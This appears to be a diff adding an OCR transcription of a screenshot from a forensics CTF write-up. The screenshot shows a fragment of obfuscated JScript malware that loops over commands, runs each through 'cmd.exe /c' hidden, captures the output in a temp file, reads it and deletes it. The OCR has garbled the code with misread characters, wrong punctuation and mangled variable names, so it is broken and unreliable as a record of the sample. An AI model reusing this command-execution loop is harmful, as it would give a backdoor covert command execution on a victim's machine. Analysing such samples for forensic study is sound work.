@@ -1,0 +1,13 @@
+# OCR: Pasted_image_20260414204144.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260414204144.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:43
+
+181 182 183 184 185 186 187 188 189 198
+functionFv6b()
+var m Rr = wyKN + "~dat.tmp";
+for (var i = o; i < auME.length; i++)
+WE86.Run("cmd.exe /c " + auME[i] + "\x22" + m_Rr + "\x22", 0, true):
+VarnRVNUspD(mRr); wScript.sleep(1000): QUjy.DELETEFILE(m Rr):
+return FXx9("2f532d6baec3doec7b1f98aed4774843"
+nRVN):
